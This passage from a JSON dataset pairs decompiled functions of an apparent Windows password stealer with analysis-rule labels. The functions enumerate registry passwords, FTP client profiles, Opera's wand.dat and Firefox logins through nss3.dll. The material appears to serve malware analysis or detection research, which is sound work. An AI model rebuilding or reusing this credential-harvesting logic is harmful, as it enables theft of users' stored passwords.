var_818h);\n                fcn.00401584(arg_8h, var_81ch);\n                fcn.00401522(arg_8h, var_828h);\n                fcn.00401584(arg_8h, var_824h);\n                if ((var_82ch == NULL) || (var_830h != 4)) {\n                    fcn.00401522(arg_8h, 0);\n                }\n                else {\n                    fcn.00401522(arg_8h, *var_82ch);\n                }\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_824h);\n            fcn.0040178e(var_82ch);\n            fcn.004078fd(arg_8h, hKey, var_810h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 905
    },
    "00407c4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c4f(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpString;\n    uint lpString_00;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            var_81ch = fcn.00401b82(hKey, var_810h, \"PassWord\", &var_820h);\n            var_814h = fcn.00401b82(hKey, var_810h, 0x413508, 0);\n            var_818h = fcn.00401b82(hKey, var_810h, 0x41350c, 0);\n            uVar2 = fcn.00401b82(hKey, var_810h, \"RootDirectory\", 0);\n            lpString = fcn.00401b82(hKey, var_810h, 0x413523, 0);\n            lpString_00 = fcn.00401b82(hKey, var_810h, 0x41355f, 0);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0010);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, var_818h);\n                fcn.00401558(arg_8h, var_81ch, var_820h);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, uVar2);\n                fcn.00401584(arg_8h, lpString_00);\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(uVar2);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.00407c4f(arg_8h, hKey, var_810h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 782
    },
    "00407eb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407eb0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x20, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar5 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        uVar2 = sub.shlwapi.dll_StrStrIA(lpString, \"FTPCON\");\n        pcVar4 = pcVar5;\n        iVar3 = sub.shlwapi.dll_StrStrIA(pcVar5, \"FTP CONTROL\", uVar2);\n        if ((iVar3 != 0) || (pcVar4 != NULL)) {\n            uVar2 = fcn.0040223e(lpString);\n            arg_ch_00 = fcn.00401c5d(uVar2, 0x413582);\n            uVar2 = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \".prf\", 0xbeef0000);\n            fcn.0040178e(uVar2);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar3 = -1;\n        pcVar4 = pcVar5;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n    } while( true );\n}\n",
        "token_count": 473
    },
    "00407f4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407f4a(uint arg_8h, int32_t *arg_ch, uint *arg_10h)\n\n{\n    uint uBytes;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint var_4h;\n    \n    uBytes = fcn.004013a0(arg_8h, arg_ch);\n    iVar1 = fcn.004010d6(arg_8h, uBytes);\n    if ((iVar1 == 0) || (*arg_ch == 0)) {\n        arg_8h = 0;\n    }\n    else {\n        arg_ch_00 = fcn.004017a5(uBytes);\n        fcn.0040137a(arg_8h, arg_ch_00, uBytes, arg_ch);\n        if (*arg_ch == 0) {\n            fcn.0040178e(arg_8h);\n            arg_8h = 0;\n        }\n        else if (arg_10h != NULL) {\n            *arg_10h = uBytes;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 238
    },
    "00407fd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407fd6(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint hMem;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    \n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_14h == 0)) {\n        return 0;\n    }\n    if ((arg_ch == 0) || ((arg_ch & 7) != 0)) {\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h & 7) == 0)) {\n        hMem = 0;\n        puVar1 = fcn.004017a5(arg_ch + 0xb);\n        puVar5 = 0x41358c;\n        puVar2 = puVar1;\n        for (iVar3 = 0xb; uVar8 = arg_ch,  puVar6 = arg_8h,  iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar2 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        fcn.004022aa(puVar1, arg_ch + 0xb, &var_10h);\n        fcn.0040178e(puVar1);\n        iVar3 = arg_ch + 0x1b;\n        puVar2 = fcn.004017a5(iVar3);\n        puVar7 = &var_10h;\n        puVar5 = puVar2;\n        for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puVar1 = 0x41358c;\n        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        for (; arg_ch != 0; arg_ch = arg_ch - 1) {\n            *puVar5 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.004022aa(puVar2, iVar3, &var_20h);\n        fcn.0040178e(puVar2);\n        puVar7 = &var_10h;\n        puVar9 = &var_38h;\n        for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        puVar7 = &var_20h;\n        for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        fcn.004114e4(&var_38h, 1);\n        arg_14h = arg_14h >> 3;\n        iVar3 = arg_10h;\n        if (arg_14h != 0) {\n            for (; arg_14h != 0; arg_14h = arg_14h - 1) {\n                fcn.00411768(iVar3, iVar3, &var_18h);\n                iVar3 = iVar3 + 8;\n            }\n            if (*(iVar3 + -1) < 9) {\n                iVar3 = iVar3 - *(iVar3 + -1);\n            }\n            uVar8 = iVar3 - arg_10h >> 1;\n            iVar3 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_10h, uVar8, 0, 0, 0, 0);\n            if (iVar3 != 0) {\n                iVar4 = iVar3;\n                hMem = fcn.004017a5(iVar3);\n                iVar3 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_10h, uVar8, hMem, iVar3, 0, 0, iVar4);\n                if (iVar3 == 0) {\n                    fcn.0040178e(hMem);\n                    hMem = 0;\n                }\n            }\n        }\n        return hMem;\n    }\n    return 0;\n}\n",
        "token_count": 1239
    },
    "004081ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004081ea(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    \n    if (5 < arg_ch) {\n        fcn.004013a0(arg_8h, arg_10h);\n        fcn.00407fb8(arg_8h, arg_10h);\n        fcn.00407fb8(arg_8h, arg_10h);\n    }\n    uVar1 = fcn.00408169(arg_8h, arg_10h);\n    *arg_14h = uVar1;\n    fcn.00407fb8(arg_8h, arg_10h);\n    if (3 < arg_ch) {\n        fcn.00407fb8(arg_8h, arg_10h);\n        fcn.00407fb8(arg_8h, arg_10h);\n    }\n    fcn.00401424(arg_8h, 0x18, arg_10h);\n    fcn.004013a0(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 249
    },
    "004082ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004082ab(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t pszFirst;\n    \n    fcn.00401424(arg_8h, 1, arg_14h);\n    iVar1 = fcn.004013a0(arg_8h, arg_14h);\n    while ((iVar1 != 0 && (*arg_14h != 0))) {\n        pszFirst = 0;\n        iVar2 = fcn.004081ea(arg_8h, arg_10h, arg_14h, &pszFirst);\n        if (pszFirst == 0) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = sub.shlwapi.dll_StrStrIA(pszFirst, 0x413597);\n            if (var_14h == 0) {\n                var_14h = sub.shlwapi.dll_StrStrIA(pszFirst, 0x41359f);\n            }\n        }\n        if (var_14h != 0) {\n            fcn.00401522(arg_ch, 0xbeef0001);\n            fcn.00401584(arg_ch, pszFirst);\n        }\n        while ((iVar2 != 0 && (*arg_14h != 0))) {\n            var_8h = 0;\n            var_ch = 0;\n            var_10h = 0;\n            fcn.00408267(arg_8h, arg_14h, &var_8h, &var_ch, &var_10h);\n            if (((var_14h != 0) && (var_8h != 0)) && ((var_ch != 0 || (var_10h != 0)))) {\n                fcn.00401584(arg_ch, var_8h);\n                fcn.00401584(arg_ch, var_ch);\n                fcn.00401584(arg_ch, var_10h);\n            }\n            fcn.0040178e(var_8h);\n            fcn.0040178e(var_ch);\n            fcn.0040178e(var_10h);\n            iVar2 = iVar2 + -1;\n        }\n        if (var_14h != 0) {\n            fcn.00401522(arg_ch, 0);\n            fcn.00401522(arg_ch, 0);\n            fcn.00401522(arg_ch, 0);\n        }\n        fcn.0040178e(pszFirst);\n        iVar1 = iVar1 + -1;\n    }\n    return;\n}\n",
        "token_count": 612
    },
    "0040841b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040841b(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t lpString;\n    int32_t lpString_00;\n    int32_t lpString_01;\n    int32_t iVar4;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00401091(arg_8h);\n    if (uVar1 < 0x10) {\n        return 1;\n    }\n    fcn.004012e8(arg_8h);\n    var_8h = 1;\n    var_4h = fcn.004013a0(arg_8h, &var_8h);\n    if (((var_8h == 0) || (var_4h < 2)) || (6 < var_4h)) {\n        return 1;\n    }\n    iVar2 = fcn.004013a0(arg_8h, &var_8h);\n    if ((var_8h == 0) || (iVar2 != 0)) {\n        return 1;\n    }\n    if (var_4h < 5) {\n        var_1ch = fcn.004013a0(arg_8h, &var_8h);\n        fcn.00401424(arg_8h, 4, &var_8h);\n    }\n    else {\n        fcn.00401424(arg_8h, 0x18, &var_8h);\n        var_1ch = fcn.004013a0(arg_8h, &var_8h);\n    }\n    fcn.00407fb8(arg_8h, &var_8h);\n    if (var_1ch == 1) {\n        fcn.004082ab(arg_8h, arg_ch, var_4h, &var_8h);\n        fcn.00407fb8(arg_8h, &var_8h);\n    }\n    if (var_8h != 0) {\n        fcn.004082ab(arg_8h, arg_ch, var_4h, &var_8h);\n        if (var_8h != 0) {\n            iVar2 = fcn.004013a0(arg_8h, &var_8h);\n            while (((var_8h != 0 && (iVar2 != 0)) && (uVar3 = fcn.004014db(arg_8h),  uVar3 != uVar1))) {\n                if (5 < var_4h) {\n                    fcn.004013a0(arg_8h, &var_8h);\n                    fcn.00407fb8(arg_8h, &var_8h);\n                    fcn.00407fb8(arg_8h, &var_8h);\n                }\n                lpString = fcn.00408169(arg_8h, &var_8h);\n                lpString_00 = fcn.00408169(arg_8h, &var_8h);\n                lpString_01 = fcn.00408169(arg_8h, &var_8h);\n                if ((((lpString != 0) && (lpString_00 != 0)) && (lpString_01 != 0)) && (var_8h != 0)) {\n                    iVar4 = sub.shlwapi.dll_StrStrIA(lpString, 0x4135a8);\n                    if ((iVar4 == 0) && (iVar4 = sub.shlwapi.dll_StrStrIA(lpString, 0x413597),  iVar4 == 0)) {\n                        iVar4 = sub.shlwapi.dll_StrStrIA(lpString, 0x41359f);\n                    }\n                    if (iVar4 != 0) {\n                        fcn.00401522(arg_ch, 0xbeef0000);\n                        fcn.00401584(arg_ch, lpString);\n                        fcn.00401584(arg_ch, lpString_00);\n                        fcn.00401584(arg_ch, lpString_01);\n                    }\n                }\n                fcn.0040178e(lpString);\n                fcn.0040178e(lpString_00);\n                fcn.0040178e(lpString_01);\n                iVar2 = iVar2 + -1;\n            }\n            return var_8h;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1016
    },
    "004086a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004086a4(uchar *arg_8h, char *arg_ch, uint pszSrch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *hMem;\n    uint pszFirst;\n    uint lpFileName;\n    uint hFindFile;\n    uint32_t lpFindFileData;\n    uchar auStack280 [276];\n    \n    lpFileName = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004023cb(arg_ch);\n        if (iVar1 == 0) {\n            lpFileName = fcn.00401c09(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            lpFileName = fcn.00401c09(arg_ch, 0x4127e7);\n        }\n        fcn.004017bc(&lpFindFileData, 0x13e);\n        iVar1 = sub.kernel32.dll_FindFirstFileA(lpFileName, &lpFindFileData);\n        if (iVar1 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) == 0) {\n                    hMem = auStack280;\n                    iVar2 = sub.shlwapi.dll_StrStrIA();\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                        uVar3 = fcn.00401c5d(uVar3, auStack280);\n                        hMem = arg_8h;\n                        fcn.0040865f(arg_8h, uVar3);\n                        fcn.0040178e(hMem);\n                    }\n                }\n                else {\n                    hMem = 0x4127dd;\n                    iVar2 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar2 != 0) {\n                        hMem = 0x4127df;\n                        iVar2 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004023cb(arg_ch);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                            }\n                            else {\n                                uVar3 = fcn.00401c09(arg_ch, 0);\n                            }\n                            uVar3 = fcn.00401c5d(uVar3, auStack280);\n                            hMem = arg_8h;\n                            fcn.004086a4(arg_8h, uVar3, pszSrch);\n                            fcn.0040178e(hMem);\n                        }\n                    }\n                }\n                iVar2 = sub.kernel32.dll_FindNextFileA(iVar1, &lpFindFileData, hMem);\n            } while (iVar2 != 0);\n            sub.kernel32.dll_FindClose(iVar1);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    return;\n}\n",
        "token_count": 646
    },
    "00408828": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408828(uint arg_8h, char *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uint uVar3;\n    uint pszFirst;\n    uint var_14ch;\n    uint lpFileName;\n    uint hFindFile;\n    uint32_t lpFindFileData;\n    uchar auStack280 [276];\n    \n    lpFileName = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        lpFileName = fcn.00401c09(arg_ch, \"\\\\*.*\");\n        uVar3 = 0x13e;\n        fcn.004017bc(&lpFindFileData, 0x13e);\n        iVar1 = sub.kernel32.dll_FindFirstFileA(lpFileName, &lpFindFileData);\n        if (iVar1 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) != 0) {\n                    uVar3 = 0x4127dd;\n                    iVar2 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar2 != 0) {\n                        uVar3 = 0x4127df;\n                        iVar2 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                            arg_ch_00 = fcn.00401c5d(uVar3, auStack280);\n                            uVar3 = arg_ch_00;\n                            iVar2 = sub.shlwapi.dll_StrStrIA();\n                            if (iVar2 != 0) {\n                                uVar3 = arg_8h;\n                                fcn.004086a4(arg_8h, arg_ch_00, \"wand.dat\");\n                            }\n                            fcn.0040178e(uVar3);\n                        }\n                    }\n                }\n                iVar2 = sub.kernel32.dll_FindNextFileA(iVar1, &lpFindFileData, uVar3);\n            } while (iVar2 != 0);\n            sub.kernel32.dll_FindClose(iVar1);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    return;\n}\n",
        "token_count": 480
    },
    "00408a73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a73(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_ch;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            iVar1 = fcn.00401b82(hKey, arg_ch, 0x41364f, 0);\n            if (iVar1 != 0) {\n                fcn.00403d3e(arg_8h, iVar1, 0xbeef0001);\n            }\n            fcn.0040178e(iVar1);\n            fcn.00408a73(arg_8h, hKey, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "00408de0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408de0(int32_t lpString, uint lpPathName)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    \n    *0x4137ff = 0;\n    uVar4 = 0;\n    uVar1 = sub.kernel32.dll_lstrlenA(lpString);\n    if ((2 < uVar1) && (piVar3 = lpString + uVar1 + -2,  *piVar3 == 0x5c5c)) {\n        *piVar3 = 0x5c;\n    }\n    sub.kernel32.dll_SetCurrentDirectoryA(lpPathName);\n    iVar2 = fcn.004022e9(\"nss3.dll\", 0x4137db);\n    if (iVar2 != 0) {\n        iVar2 = (**0x4137db)(lpString);\n        if (iVar2 == 0) {\n            *0x4137ff = (**0x4137eb)();\n            if (*0x4137ff == 0) {\n                (**0x4137df)();\n            }\n            else {\n                iVar2 = (**0x4137ef)(*0x4137ff, 1, 0);\n                if (iVar2 == 0) {\n                    uVar4 = 1;\n                }\n                else {\n                    (**0x4137f7)(*0x4137ff);\n                    (**0x4137df)();\n                    *0x4137ff = 0;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 349
    },
    "00408e98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00408e98(void)\n\n{\n    if (*0x4137ff != 0) {\n        (**0x4137f7)(*0x4137ff);\n        (**0x4137df)();\n        *0x4137ff = 0;\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00408ec1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00408ec1(char *arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    char *arg_ch_00;\n    uint var_10h;\n    int32_t iStack16;\n    int32_t iStack12;\n    int32_t var_4h;\n    \n    if (((arg_8h != NULL) && (arg_ch != 0)) && (*arg_8h != '\\0')) {\n        if ((*arg_8h != '~') && (*0x4137ff == 0)) {\n            return NULL;\n        }\n        if (*arg_8h == '~') {\n            if (((arg_ch - 1U & 3) == 0) && (arg_ch != 1)) {\n                arg_10h = fcn.004017a5((arg_ch + 0x3ff) * 4);\n                arg_8h = arg_8h + 1;\n                fcn.004024bb(arg_8h, arg_ch + -1, arg_10h);\n            }\n            else {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        arg_ch_00 = NULL;\n        var_4h = (**0x4137e3)(0, 0, arg_8h, arg_ch);\n        if (var_4h != 0) {\n            fcn.004017bc(&var_10h, 0xc);\n            iVar1 = (**0x4137f3)(var_4h, &var_10h, 0);\n            if (iVar1 == 0) {\n                if (iStack16 != 0) {\n                    arg_ch_00 = fcn.004017a5(iStack12 + 1);\n                    fcn.004017dc(iStack16, arg_ch_00, iStack12);\n                }\n                (**0x4137e7)(&var_10h, 0);\n            }\n            (**0x4137e7)(var_4h, 1);\n        }\n        return arg_ch_00;\n    }\n    return NULL;\n}\n",
        "token_count": 469
    },
    "00409049": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409049(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *arg_8h_00;\n    int32_t hMem;\n    uint uVar3;\n    int32_t iVar4;\n    char *lpString_00;\n    uint arg_8h_01;\n    uint arg_8h_02;\n    uint uVar5;\n    char *pcVar6;\n    char *arg_8h_03;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint psz1;\n    uint var_3ch;\n    uint lpString;\n    uint lpString1;\n    uint lpString2;\n    uint var_2ch;\n    uint var_28h;\n    char *var_24h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401d47(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.00403e3a(arg_ch);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00408de0(arg_10h, arg_14h);\n    iVar2 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar2 != 0) {\n        arg_8h_00 = fcn.00402409(var_8h, var_4h);\n        if (arg_8h_00 != NULL) {\n            if (*arg_8h_00 != '\\0') {\n                hMem = fcn.0040900d(arg_8h_00);\n                uVar3 = sub.kernel32.dll_lstrcmpA(0x413870, hMem);\n                iVar8 = hMem;\n                uVar3 = sub.kernel32.dll_lstrcmpA(0x413874, hMem, uVar3);\n                iVar7 = 0x413878;\n                iVar2 = hMem;\n                iVar4 = sub.kernel32.dll_lstrcmpA(0x413878, hMem, uVar3);\n                if (((iVar4 == 0) || (iVar7 == 0)) || (iVar2 == 0)) {\n                    iVar4 = -1;\n                    pcVar6 = arg_8h_00;\n                    do {\n                        arg_8h_03 = pcVar6;\n                        if (iVar4 == 0) break;\n                        iVar4 = iVar4 + -1;\n                        arg_8h_03 = pcVar6 + 1;\n                        cVar1 = *pcVar6;\n                        pcVar6 = arg_8h_03;\n                    } while (cVar1 != '\\0');\n                    var_18h = 0;\n                    do {\n                        if (*arg_8h_03 == '\\0') break;\n                        uVar3 = fcn.0040900d(arg_8h_03);\n                        if (var_18h == 0) {\n                            iVar4 = sub.kernel32.dll_lstrcmpA();\n                            if (iVar4 == 0) {\n                                var_18h = 1;\n                            }\n                        }\n                        else {\n                            if (var_18h == 1) {\n                                var_18h = 2;\n                                var_1ch = arg_8h_03;\n                            }\n                            else if (var_18h == 2) {\n                                var_18h = 3;\n                            }\n                            else if (var_18h == 3) {\n                                var_18h = 4;\n                                var_24h = arg_8h_03;\n                            }\n                            else if (var_18h == 4) {\n                                var_18h = 5;\n                            }\n                            else if (var_18h == 5) {\n                                if (iVar2 == 0) {\n                                    var_18h = 2;\n                                }\n                                else {\n                                    var_18h = 6;\n                                }\n                                var_44h = 0;\n                                var_48h = 0;\n                                lpString_00 = fcn.0040900d(var_1ch);\n                                arg_8h_01 = fcn.0040900d(var_24h);\n                                pcVar6 = arg_8h_03;\n                                arg_8h_02 = fcn.0040900d(arg_8h_03);\n                                if (*0x4137fb == 0) {\n                                    